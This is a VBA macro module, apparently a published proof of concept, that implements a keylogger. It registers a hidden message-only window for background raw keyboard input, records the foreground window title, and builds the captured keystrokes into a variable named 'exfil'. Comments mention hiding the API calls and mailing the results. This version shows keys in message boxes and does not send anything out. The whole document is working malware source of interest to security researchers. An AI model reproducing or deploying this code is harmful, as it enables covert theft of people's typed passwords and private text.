'PoC By Juan Manuel Fernández (@TheXC3LL)
'This can be hidden using DispCallFunc trick
Private Declare PtrSafe Function RegisterClassEx Lib "user32" Alias "RegisterClassExA" (pcWndClassEx As WNDCLASSEX) As Integer
Private Declare PtrSafe Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As LongPtr, ByVal hMenu As LongPtr, ByVal hInstance As LongPtr, ByVal lpParam As LongPtr) As LongPtr
Private Declare PtrSafe Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As LongPtr, ByVal wMsg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
Private Declare PtrSafe Function GetMessage Lib "user32" Alias "GetMessageA" (lpMsg As MSG, ByVal hwnd As LongPtr, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
Private Declare PtrSafe Function TranslateMessage Lib "user32" (lpMsg As MSG) As Long
Private Declare PtrSafe Function DispatchMessage Lib "user32" Alias "DispatchMessageA" (lpMsg As MSG) As LongPtr
Private Declare PtrSafe Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr
Private Declare PtrSafe Function RegisterRawInputDevices Lib "user32" (ByRef pRawInputDevices As RAWINPUTDEVICE, ByVal uiNumDevices As Integer, ByVal cbSize As Integer) As Boolean
Private Declare PtrSafe Function NtUserGetRawInputData Lib "win32u" (ByVal hRawInput As LongPtr, ByVal uiCommand As LongLong, ByRef pData As Any, ByRef pcbSize As Long, ByVal cbSizeHeader As Long) As LongLong
Private Declare PtrSafe Function GetProcessHeap Lib "kernel32" () As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongLong) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByRef Destination As Any, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare PtrSafe Function HeapFree Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, lpMem As Any) As Long
Private Declare PtrSafe Function GetForegroundWindow Lib "user32" () As LongPtr
Private Declare PtrSafe Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As LongPtr) As Long
Private Declare PtrSafe Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As LongPtr, ByVal lpString As LongPtr, ByVal cch As Long) As Long
Private Declare PtrSafe Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare PtrSafe Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare PtrSafe Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, ByVal lpwTransKey As LongLong, ByVal fuState As Long) As Long
Private Declare PtrSafe Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (ByVal wCode As Long, ByVal wMapType As Long) As Long

Private Type WNDCLASSEX
    cbSize As Long
    style As Long
    lpfnWndProc As LongPtr
    cbClsExtra As Long
    cbWndExtra As Long
    hInstance As LongPtr
    hIcon As LongPtr
    hCursor As LongPtr
    hbrBackground As LongPtr
    lpszMenuName As String
    lpszClassName As String
    hIconSm As LongPtr
End Type

Private Type POINTAPI
        x As Long
        y As Long
End Type

Private Type MSG
    hwnd As LongPtr
    Message As Long
    wParam As LongPtr
    lParam As LongPtr
    time As Long
    pt As POINTAPI
End Type

Private Type RAWINPUTDEVICE
     usUsagePage As Integer
     usUsage As Integer
     dwFlags As Long
     hwndTarget As LongPtr
End Type

Private Type RAWINPUTHEADER
    dwType As Long '0-4 = 4 bytes
    dwSize As Long '4-8 = 4 Bytes
    hDevice As LongPtr '8-16 = 8 Bytes
    wParam As LongPtr '16-24 = 8 Bytes
End Type

Private Type RAWKEYBOARD
    MakeCode As Integer '0-2 = 2 bytes
    Flags As Integer '2-4 = 2 bytes
    Reserved As Integer '4-6 = 2 bytes
    VKey As Integer '6-8 = 2 bytes
    Message As Long '8-12 = 4 bytes
    ExtraInformation As Long '12-16 = 4 bytes
End Type

Private Type RAWINPUT
    header As RAWINPUTHEADER
    data As RAWKEYBOARD
End Type

Public oldTitle As String
Public newTittle As String
Public lastKey As Long
Public cleaner(0 To 255) As Byte


Private Function FunctionPointer(addr As LongPtr) As LongPtr
  ' https://renenyffenegger.ch/notes/development/languages/VBA/language/operators/addressOf
    FunctionPointer = addr
End Function

'https://www.freevbcode.com/ShowCode.asp?ID=209
Public Function ByteArrayToString(bytArray() As Byte) As String
    Dim sAns As String
    Dim iPos As String
    
    sAns = StrConv(bytArray, vbUnicode)
    iPos = InStr(sAns, Chr(0))
    If iPos > 0 Then sAns = Left(sAns, iPos - 1)
    
    ByteArrayToString = sAns
 
 End Function

Public Sub launcher()
    Dim hwnd As LongPtr
    Dim mesg As MSG
    Dim wc As WNDCLASSEX
    Dim result As LongPtr
    Dim HWND_MESSAGE As Long
    
    'Some initialization for later
    oldTitle = "AdeptsOf0xCC"
    lastKey = 0

    'First we need to set a window class
    wc.cbSize = LenB(wc)
    wc.lpfnWndProc = FunctionPointer(AddressOf WndProc) 'We need to save this code as Module in order to use the AddressOf trick to get the our callback location
    wc.hInstance = GetModuleHandle(vbNullString)
    wc.lpszClassName = "VBAHELLByXC3LL"

    'Register our class
    result = RegisterClassEx(wc)

    'Create the window so we can snoop messages
    HWND_MESSAGE = (-3&)
    hwnd = CreateWindowEx(0, "VBAHELLByXC3LL", 0, 0, 0, 0, 0, 0, HWND_MESSAGE, 0&, GetModuleHandle(vbNullString), 0&)

End Sub


'Our callback
Private Function WndProc(ByVal lhwnd As LongPtr, ByVal tMessage As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
    Dim WM_CREATE As Long
    Dim WM_INPUT As Long
    Dim WM_KEYDOWN As Long
    Dim WM_SYSKEYDOWN As Long
    Dim VK_CAPITAL As Long
    Dim VK_SCROLL As Long
    Dim VK_NUMLOCK As Long
    Dim VK_CONTROL As Long
    Dim VK_MENU As Long
    Dim VK_BACK As Long
    Dim VK_RETURN As Long
    Dim VK_SHIFT As Long
    Dim RIDEV_INPUTSINK As Long
    Dim RIM_TYPEKEYBOARD As Long
    Dim rid(50) As RAWINPUTDEVICE
    Dim RawInputHeader_ As RAWINPUTHEADER
    Dim dwSize As Long
    Dim fgWindow As LongPtr
    Dim wSize As Long
    Dim fgTitle() As Byte
    Dim wKey As Integer
    Dim result As Long
    
    WM_CREATE = &H1
    WM_INPUT = &HFF
    WM_KEYDOWN = &H100
    WM_SYSKEYDOWN = &H104
    
    VK_CAPITAL = &H14
    VK_SCROLL = &H91
    VK_NUMLOCK = &H90
    VK_CONTROL = &H11
    VK_MENU = &H12
    VK_BACK = &H8
    VK_RETURN = &HD
    VK_SHIFT = &H10
    
    RIDEV_INPUTSINK = &H100
    RIM_TYPEKEYBOARD = &H1&
    
    'Check the message type and trigger an action if needed
    Select Case tMessage
    Case WM_CREATE ' Register us
        rid(0).usUsagePage = &H1
        rid(0).usUsage = &H6
        rid(0).dwFlags = RIDEV_INPUTSINK
        rid(0).hwndTarget = lhwnd
        r = RegisterRawInputDevices(rid(0), 1, LenB(rid(0)))
        
    Case WM_INPUT
        Dim pbuffer() As Byte
        Dim buffer As RAWINPUT
        
        'First we get the size
        r = NtUserGetRawInputData(lParam, &H10000003, vbNullString, dwSize, LenB(RawInputHeader_))
        ReDim pbuffer(0 To dwSize - 1)
        'And then we save the data
        r = NtUserGetRawInputData(lParam, &H10000003, pbuffer(0), dwSize, LenB(RawInputHeader_))
        If r <> 0 Then
            'VBA hacky things to cast the data into a RAWINPUT struct
            Call CopyMemory(buffer, VarPtr(pbuffer(0)), dwSize)
            If (buffer.header.dwType = RIM_TYPEKEYBOARD) And (buffer.data.Message = WM_KEYDOWN) Or (buffer.data.Message = WM_SYSKEYDOWN) Then
                'Check the window title to know where the key was sent
                'We want to know if the title is the same, so when we add this info to our mail we don't paste a title per key
                'Just one title and all the keys related ;)
                fgWindow = GetForegroundWindow()
                wSize = GetWindowTextLength(fgWindow) + 1
                ReDim fgTitle(0 To wSize - 1)
                r = GetWindowText(fgWindow, VarPtr(fgTitle(0)), wSize)
                newTitle = ByteArrayToString(fgTitle)
                If newTitle <> oldTitle Then
                    oldTitle = newTitle
                End If
                
                GetKeyState (VK_CAPITAL)
                GetKeyState (VK_SCROLL)
                GetKeyState (VK_NUMLOCK)
                GetKeyState (VK_CONTROL)
                GetKeyState (VK_MENU)
                Dim lpKeyboard(0 To 255) As Byte
                r = GetKeyboardState(lpKeyboard(0))
                
                Select Case buffer.data.VKey
                Case VK_BACK
                    exfil = exfil & "[<]"
                Case VK_RETURN
                    exfil = exfil & vbNewLine
                Case Else
                    'Something funny undocumented: ToAscii "breaks" the keyboard status, so we need to perform this shitty thing to "fix" it
                    'Dealing with deadkeys is a pain in the ass T_T (á, é, í, ó, ú...)
                    result = ToAscii(buffer.data.VKey, MapVirtualKey(buffer.data.VKey, 0), lpKeyboard(0), VarPtr(wKey), 0)
                    If result = -1 Then
                        lastKey = buffer.data.VKey
                        Do While ToAscii(buffer.data.VKey, MapVirtualKey(buffer.data.VKey, 0), lpKeyboard(0), VarPtr(wKey), 0) < 0
                        Loop
                    Else
                        If wKey < 256 Then
                            MsgBox Chr(wKey), 0, oldTitle
                        End If
                        If lastKey <> 0 Then
                            Call CopyMemory(lpKeyboard(0), VarPtr(cleaner(0)), 256)
                            result = ToAscii(lastKey, MapVirtualKey(buffer.data.VKey, 0), lpKeyboard(0), VarPtr(wKey), 0)
                            lastKey = 0
                        End If
                    End If
                End Select
            End If
        End If
        
     Case Else
        WndProc = DefWindowProc(lhwnd, tMessage, wParam, lParam)
     End Select
End Function
